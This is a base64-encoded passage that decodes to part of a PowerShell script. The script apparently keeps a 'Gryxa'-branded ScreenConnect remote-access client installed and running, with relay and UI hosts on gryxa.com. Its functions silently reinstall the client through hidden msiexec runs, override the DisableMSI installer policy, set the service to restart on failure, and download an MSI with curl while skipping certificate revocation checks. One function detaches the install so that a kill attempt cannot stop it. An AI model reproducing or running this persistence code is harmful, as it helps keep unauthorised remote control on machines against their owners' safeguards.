ICgkRmluZ2VycHJpbnQpIikKICAgICkKICAgICRwYXR0ZXJucyA9IEAoJ3VwZGF0ZS5ncnl4YS5j
b20nLCAndWkuZ3J5eGEuY29tJywgJ2dyeXhhLmNvbScpCiAgICBmb3JlYWNoICgkZCBpbiAkZGly
cykgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyBjb250
aW51ZSB9CiAgICAgICAgJGZpbGVzID0gQChHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkZCAt
RmlsZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0
IDYwKQogICAgICAgIGZvcmVhY2ggKCRmIGluICRmaWxlcykgewogICAgICAgICAgICBmb3JlYWNo
ICgkcGF0IGluICRwYXR0ZXJucykgewogICAgICAgICAgICAgICAgaWYgKFNlbGVjdC1TdHJpbmcg
LUxpdGVyYWxQYXRoICRmLkZ1bGxOYW1lIC1QYXR0ZXJuICRwYXQgLVNpbXBsZU1hdGNoIC1RdWll
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgIHJl
dHVybiAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHRy
eSB7CiAgICAgICAgICAgICAgICBpZiAoJGYuTGVuZ3RoIC1ndCAyTUIpIHsgY29udGludWUgfQog
ICAgICAgICAgICAgICAgJGJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRm
LkZ1bGxOYW1lKQogICAgICAgICAgICAgICAgJHRleHQgPSBbU3lzdGVtLlRleHQuRW5jb2Rpbmdd
OjpVbmljb2RlLkdldFN0cmluZygkYnl0ZXMpCiAgICAgICAgICAgICAgICBpZiAoJHRleHQgLW1h
dGNoICdncnl4YVwuY29tJykgeyByZXR1cm4gJHRydWUgfQogICAgICAgICAgICAgICAgJHRleHQ4
ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGJ5dGVzKQogICAgICAg
ICAgICAgICAgaWYgKCR0ZXh0OCAtbWF0Y2ggJ2dyeXhhXC5jb20nKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICAgICAgICAgIH0gY2F0Y2gge30KICAgICAgICB9CiAgICB9CiAgICAkaW1nID0gKEdldC1J
dGVtUHJvcGVydHkgIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1wkbmFt
ZSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkltYWdlUGF0aAogICAgaWYgKCRpbWcg
LWFuZCAoJGltZyAtbWF0Y2ggJ2dyeXhhXC5jb20nKSkgeyByZXR1cm4gJHRydWUgfQogICAgaWYg
KEZpbmQtUHJvZHVjdEd1aWQgJEZpbmdlcnByaW50KSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1
cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIFRlc3QtU2NSdW5uaW5nKFtzdHJpbmddJEZpbmdlcnByaW50
KSB7CiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAkc3Zj
ID0gR2V0LVNlcnZpY2UgLU5hbWUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQp
IiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgcmV0dXJuIFtib29sXSgkc3ZjIC1h
bmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykKfQoKZnVuY3Rpb24gVGVzdC1TY0Rpcihbc3Ry
aW5nXSRGaW5nZXJwcmludCkgewogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgewogICAgICAgIGlmIChUZXN0LVBhdGgg
LUxpdGVyYWxQYXRoIChKb2luLVBhdGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmlu
Z2VycHJpbnQpIikpIHsgcmV0dXJuICR0cnVlIH0KICAgIH0KICAgIHJldHVybiAkZmFsc2UKfQoK
ZnVuY3Rpb24gRmluZC1SdW5uaW5nR3J5eGFGcCB7CiAgICAjIEFOWSBub24tc2V2cnogU2NyZWVu
Q29ubmVjdCBDbGllbnQgdGhhdCBpcyBSdW5uaW5nL3N0YXJ0aW5nIGNvdW50cyBhcyBHcnl4YS4K
ICAgICMgRG8gTk9UIHJlcXVpcmUgcmVsYXktc3RyaW5nIHNjYW4gKGZhbHNlIG5lZ2F0aXZlcyBj
YXVzZWQgcmVpbnN0YWxsIGxvb3BzKS4KICAgICRjZmcgPSBHZXQtR3J5eGFGcAogICAgaWYgKFRl
c3QtU2NSdW5uaW5nICRjZmcpIHsgcmV0dXJuICRjZmcgfQogICAgZm9yZWFjaCAoJHN2YyBpbiAo
R2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUpKSB7CiAgICAgICAgaWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5u
aW5nJywgJ1N0YXJ0UGVuZGluZycsICdDb250aW51ZVBlbmRpbmcnKSkgeyBjb250aW51ZSB9CiAg
ICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsKICAgICAg
ICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAgLWlu
ICRzY3JpcHQ6U2V2cnpLZWVwKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgcmV0dXJuICRmcAog
ICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBUZXN0LUFueU5vblNl
dnJ6U2NSdW5uaW5nIHsKICAgIHJldHVybiBbYm9vbF0oRmluZC1SdW5uaW5nR3J5eGFGcCkKfQoK
ZnVuY3Rpb24gVGVzdC1Hcnl4YUhlYWx0aCB7CiAgICAjIExPQ0FMIGhlYWx0aCBvbmx5LiBUQ1Av
cmVsYXkgbmV2ZXIgbWFyayBVTkhFQUxUSFkgKGF2b2lkcyBwYW5lbCBkdXBsaWNhdGVzKS4KICAg
ICRmcCA9IEdldC1Hcnl4YUZwCiAgICAkcnVubmluZ0ZwID0gRmluZC1SdW5uaW5nR3J5eGFGcAog
ICAgaWYgKCRydW5uaW5nRnApIHsKICAgICAgICBpZiAoJHJ1bm5pbmdGcCAtbmUgJGZwKSB7IFNl
dC1Hcnl4YUZwICRydW5uaW5nRnA7ICRmcCA9ICRydW5uaW5nRnAgfQogICAgICAgICR0Y3BSZWxh
eSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0NDMKICAgICAgICAk
dGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFVaUhvc3QgNDQzCiAgICAgICAg
cmV0dXJuICJIRUFMVEhZfCRmcHxydW5uaW5nPTF8cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaSIK
ICAgIH0KCiAgICAkcmVhc29ucyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVy
aWMuTGlzdFtzdHJpbmddCiAgICBpZiAoLW5vdCAoVGVzdC1TY1J1bm5pbmcgJGZwKSkgewogICAg
ICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRmcCki
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYgKC1ub3QgJHN2YykgeyBb
dm9pZF0kcmVhc29ucy5BZGQoJ3N2Yy1taXNzaW5nJykgfQogICAgICAgIGVsc2UgeyBbdm9pZF0k
cmVhc29ucy5BZGQoInN2Yy0kKCRzdmMuU3RhdHVzKSIpIH0KICAgIH0KICAgIGlmICgtbm90IChU
ZXN0LVNjRGlyICRmcCkgLWFuZCAtbm90IChGaW5kLVByb2R1Y3RHdWlkICRmcCkpIHsKICAgICAg
ICBbdm9pZF0kcmVhc29ucy5BZGQoJ25vdC1pbnN0YWxsZWQnKQogICAgfQoKICAgICR0Y3BSZWxh
eSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0NDMKICAgICR0Y3BV
aSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMKICAgIGlmICgkcmVh
c29ucy5Db3VudCAtZXEgMCkgewogICAgICAgICMgcmVnaXN0ZXJlZC9kaXIgcHJlc2VudCBidXQg
c2VydmljZSBub3QgcnVubmluZyDigJQgc3RpbGwgdW5oZWFsdGh5IGZvciBzdGFydC9yZXBhaXIK
ICAgICAgICBpZiAoLW5vdCAoVGVzdC1TY1J1bm5pbmcgJGZwKSkgewogICAgICAgICAgICByZXR1
cm4gIlVOSEVBTFRIWXwkZnB8c3ZjLW5vdC1ydW5uaW5nfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNw
VWkiCiAgICAgICAgfQogICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnB8cmVsYXk9JHRjcFJlbGF5
fHVpPSR0Y3BVaSIKICAgIH0KICAgIHJldHVybiAiVU5IRUFMVEhZfCRmcHwkKCRyZWFzb25zIC1q
b2luICcsJyl8cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaSIKfQoKZnVuY3Rpb24gVGVzdC1Hcnl4
YVJlaW5zdGFsbEFsbG93ZWQgewogICAgIyBNYXggb25lIGNodXJuLXJlaW5zdGFsbCBwZXIgN2Qg
dW5sZXNzIC1Gb3JjZS4KICAgICMgTzQyOiBORVZFUiBibG9jayB3aGVuIEdyeXhhIGlzIGZ1bGx5
IGFic2VudCAoc3ZjK3Byb2R1Y3QrZGlyIGdvbmUpLgogICAgJGZwID0gR2V0LUdyeXhhRnAKICAg
ICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkc3ZjIC1hbmQgLW5vdCAo
RmluZC1SdW5uaW5nR3J5eGFGcCkgLWFuZCAtbm90IChGaW5kLVByb2R1Y3RHdWlkICRmcCkgLWFu
ZCAtbm90IChUZXN0LVNjRGlyICRmcCkpIHsKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0KICAg
ICRmbGFnID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9yZWluc3RhbGwuZmxhZycKICAgIGlm
ICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRmbGFnKSkgeyByZXR1cm4gJHRydWUgfQog
ICAgdHJ5IHsKICAgICAgICAkYWdlID0gKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBh
dGggJGZsYWcpLkxhc3RXcml0ZVRpbWUKICAgICAgICByZXR1cm4gKCRhZ2UuVG90YWxIb3VycyAt
Z2UgMTY4KQogICAgfSBjYXRjaCB7IHJldHVybiAkdHJ1ZSB9Cn0KCmZ1bmN0aW9uIE1hcmstR3J5
eGFSZWluc3RhbGwgewogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdv
cmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSkuVG9Vbml2ZXJz
YWxUaW1lKCkuVG9TdHJpbmcoJ28nKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlCn0KCmZ1bmN0aW9u
IFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50KFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBpZiAo
LW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQogICAgJG5hbWUgPSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1
aWQgJEZpbmdlcnByaW50CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvZiAyPiYxIHwg
T3V0LU51bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
b2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9m
IDI+JjEgfCBPdXQtTnVsbAogICAgaWYgKCRndWlkKSB7CiAgICAgICAgJHAgPSBTdGFydC1Qcm9j
ZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICRndWlkIC9xbiAvbm9yZXN0YXJ0IFJF
Qk9PVD1SZWFsbHlTdXBwcmVzcyIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4K
ICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2CiAgICB9CiAgICAkc3ZjID0gR2V0LVNlcnZp
Y2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgkc3Zj
KSB7CiAgICAgICAgJiBzYy5leGUgc3RvcCAkbmFtZSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAm
IHNjLmV4ZSBkZWxldGUgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAg
LVNlY29uZHMgMgogICAgfQogICAgIyBPNDU6IGNsZWFyIHN0YWxlIEFSUCBrZXkgc28gc2FtZS1G
UCBtc2lleGVjIC9pIGNhbiByZS1yZWdpc3RlciAoZml4IHN0dWNrICJyZWdpc3RlcmVkLCBubyBz
dmMvZGlyIikKICAgIGZvcmVhY2ggKCRyIGluIEAoJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxX
aW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsCiAgICAgICAgICAgICAgICAgICAgICdI
S0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lv
blxVbmluc3RhbGwnKSkgewogICAgICAgIGlmICgkZ3VpZCAtYW5kIChUZXN0LVBhdGggIiRyXCRn
dWlkIikpIHsKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICIkclwkZ3VpZCIg
LVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQog
ICAgICAgIEdldC1DaGlsZEl0ZW0gJHIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
b3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBT
UGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAg
ICAgaWYgKCRkbiAtbWF0Y2ggIlNjcmVlbkNvbm5lY3QgQ2xpZW50IFwoJChbcmVnZXhdOjpFc2Nh
cGUoJEZpbmdlcnByaW50KSlcKSIpIHsKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRl
cmFsUGF0aCAkXy5QU1BhdGggLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBmb3JlYWNoICgkYmFzZSBp
biBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMpKSB7CiAgICAg
ICAgJGQgPSBKb2luLVBhdGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJp
bnQpIgogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAg
ICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAg
UmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAncmVtb3ZlZCcKfQoK
ZnVuY3Rpb24gSW5zdGFsbC1Hcnl4YUZyb21Nc2koW3N0cmluZ10kTXNpUGF0aCkgewogICAgJiBy
ZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
bnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUg
YWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicg
L3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRs
b2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9lbnN1cmUubG9nJwogICAgJHAgPSBT
dGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi9pIGAiJE1zaVBhdGhgIiAv
cW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2IGAiJGxv
Z2AiIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgJGV4aXQgPSAkcC5F
eGl0Q29kZQogICAgaWYgKCRleGl0IC1lcSAxNjE4KSB7CiAgICAgICAgU3RhcnQtU2xlZXAgLVNl
Y29uZHMgMzAKICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50
TGlzdCAiL2kgYCIkTXNpUGF0aGAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJl
YWxseVN1cHByZXNzIC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUg
SGlkZGVuCiAgICAgICAgJGV4aXQgPSAkcC5FeGl0Q29kZQogICAgfQogICAgU3RhcnQtU2xlZXAg
LVNlY29uZHMgMTAKICAgIHJldHVybiAkZXhpdAp9CgpmdW5jdGlvbiBJbnN0YWxsLUdyeXhhRGV0
YWNoZWQoW3N0cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kRnApIHsKICAgICMgTzQ2OiBydW4gbXNp
ZXhlYyAvaSBmdWxseSBkZXRhY2hlZCAob3duIGNtZCB3cmFwcGVyKSBzbyB0aGUgU0MgR3Vlc3Qg
MTBzCiAgICAjIGtpbGwgb24gdGhlIG1vbi9wb3dlcnNoZWxsIHBhcmVudCBjYW5ub3QgYWJvcnQg
dGhlIGluc3RhbGwgbWlkLWZsaWdodC4KICAgICMgUmV0dXJucyBpbW1lZGlhdGVseTsgdGhlIE5F
WFQgdGljayBzZWVzIHRoZSBzZXJ2aWNlIGFuZCByZXBvcnRzIGhlYWx0aHkuCiAgICAkbG9nID0g
Sm9pbi1QYXRoICRXb3JrRGlyICdtc2lfZ3J5eGFfZGV0YWNoZWQubG9nJwogICAgJGNtZCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfaW5zdGFsbC5jbWQnCiAgICAkbGluZXMgPSBAKAogICAg
ICAgICdAZWNobyBvZmYnLAogICAgICAgICJtc2lleGVjIC9pIGAiJE1zaVBhdGhgIiAvcW4gL25v
cmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2IGAiJGxvZ2AiIiwK
ICAgICAgICAic2MgY29uZmlnIGAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGcClgIiBzdGFydD0g
YXV0byIsCiAgICAgICAgInNjIGZhaWx1cmUgYCJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZwKWAi
IHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQv
MzAwMCIsCiAgICAgICAgInNjIHN0YXJ0IGAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGcClgIiIs
CiAgICAgICAgJ2V4aXQnCiAgICApCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNtZCAt
VmFsdWUgJGxpbmVzIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UKICAgIFN0YXJ0LVByb2Nlc3MgY21k
LmV4ZSAtQXJndW1lbnRMaXN0ICIvYyBgIiRjbWRgIiIgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAg
cmV0dXJuICdzcGF3bmVkJwp9CgpmdW5jdGlvbiBJbnZva2UtR3J5eGFFbnN1cmUgewogICAgIyBP
NDAgSEFSRCBSVUxFOiBpZiBBTlkgbm9uLXNldnJ6IFNjcmVlbkNvbm5lY3QgaXMgUnVubmluZyAt
PiBORVZFUiAveCBvciAvaS4KICAgICMgTzQzOiBBTFdBWVMgdHJ5IHN0YXJ0L3JlcGFpciBCRUZP
UkUgcmF0ZS1saW1pdDsgLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBoZWFsCiAgICAjIChtb24g
ZGVlcCB0aWNrcyB3ZXJlIHJhdGUtbGltaXRpbmcgZm9yZXZlciB3aGlsZSBHcnl4YSBzdGF5ZWQg
U3RvcHBlZCkuCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0Rpcikp
IHsKICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1G
b3JjZSB8IE91dC1OdWxsCiAgICB9CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4
YV9lbnN1cmUubG9nJwogICAgZnVuY3Rpb24gR0xvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxp
bmUgPSAnezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3Mn
KSwgJG0KICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KCiAgICAkb2xkRnAgPSBHZXQtR3J5
eGFGcAogICAgJGRvRGVlcCA9IFtib29sXSgkRGVlcCAtb3IgJEZvcmNlIC1vciAoJEV4dHJhIC1t
YXRjaCAnKD9pKWRlZXB8Zm9yY2UnKSkKICAgIEdMb2cgImdyeXhhX2Vuc3VyZV9iZWdpbiBkZWVw
PSRkb0RlZXAgZm9yY2U9JEZvcmNlIG9sZF9mcD0kb2xkRnAiCgogICAgJHJ1bm5pbmdGcCA9IEZp
bmQtUnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAgICAgICAgU2V0LUdyeXhh
RnAgJHJ1bm5pbmdGcAogICAgICAgIEdMb2cgImFscmVhZHlfcnVubmluZ19mcD0kcnVubmluZ0Zw
IGxvY2tfbm9fcmVpbnN0YWxsIgogICAgICAgIGlmICgtbm90ICRGb3JjZSkgewogICAgICAgICAg
ICBpZiAoJGRvRGVlcCkgewogICAgICAgICAgICAgICAgJG1zaSA9IEpvaW4tUGF0aCAkV29ya0Rp
ciAncGtnX2dyeXhhLm1zaScKICAgICAgICAgICAgICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpU
RU1QICgic2NfZ3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04n
KSkKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJGN1cmwgPSBKb2lu
LVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJsLmV4ZScKICAgICAgICAgICAgICAg
ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdjdXJsLmV4ZScgfQog
ICAgICAgICAgICAgICAgICAgICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10
aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHNjcmlwdDpHcnl4YU1zaVVybCAyPiYx
IHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5k
ICgoR2V0LUl0ZW0gJHRtcCkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgewogICAgICAgICAgICAgICAg
ICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLURlc3RpbmF0aW9uICRtc2kgLUZv
cmNlCiAgICAgICAgICAgICAgICAgICAgICAgICRwcm9kTmFtZSA9IEdldC1Nc2lQcm9wZXJ0eSAk
bXNpICdQcm9kdWN0TmFtZScKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld0ZwID0gR2V0LUZw
RnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG5l
d0ZwIC1hbmQgKCRuZXdGcCAtbmUgJHJ1bm5pbmdGcCkpIHsKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIEdMb2cgImZwX2RyaWZ0X0lHTk9SRURfd2hpbGVfcnVubmluZyBydW5uaW5nPSRydW5u
aW5nRnAgbXNpPSRuZXdGcCIKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIEdMb2cgImRlZXBfZnBfbWF0Y2g9JHJ1bm5pbmdGcCIKICAg
ICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAg
ICAgIH0gY2F0Y2ggeyBHTG9nICJkZWVwX21zaV9zb2Z0ZmFpbD0kXyIgfQogICAgICAgICAgICAg
ICAgZmluYWxseSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJu
ICJIRUFMVEhZfCRydW5uaW5nRnB8cnVubmluZz0xfG5vLXJlaW5zdGFsbCIKICAgICAgICB9CiAg
ICAgICAgR0xvZyAnZm9yY2VfcmVpbnN0YWxsX2Rlc3BpdGVfcnVubmluZycKICAgIH0KCiAgICAj
IE80MzogbGlnaHQgaGVhbCBBTFdBWVMgKGV2ZW4gdW5kZXIgLURlZXApIOKAlCBzdGFydC9yZXBh
aXIgbmV2ZXIgcmF0ZS1saW1pdGVkCiAgICAkZnBUcnkgPSAkb2xkRnAKICAgIGlmIChUZXN0LVNj
UnVubmluZyAkZnBUcnkpIHsKICAgICAgICBTZXQtR3J5eGFGcCAkZnBUcnkKICAgICAgICByZXR1
cm4gIkhFQUxUSFl8JGZwVHJ5fHJ1bm5pbmc9MSIKICAgIH0KICAgICRuYW1lID0gIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICgkZnBUcnkpIgogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1l
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YykgewogICAgICAgIEdM
b2cgImxpZ2h0X3N0YXJ0X2F0dGVtcHQgc3RhdHVzPSQoJHN2Yy5TdGF0dXMpIgogICAgICAgICYg
c2MuZXhlIGNvbmZpZyAkbmFtZSBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICAgICAm
IHNjLmV4ZSBmYWlsdXJlICRuYW1lIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAv
cmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIHNjLmV4
ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25k
cyA1CiAgICAgICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAg
U3RhcnQtU2xlZXAgLVNlY29uZHMgMwogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkZnBUcnkp
IHsKICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwVHJ5CiAgICAgICAgICAgIEdMb2cgJ2xpZ2h0
X3N0YXJ0ZWRfb2snCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnBUcnl8c3RhcnRlZD0x
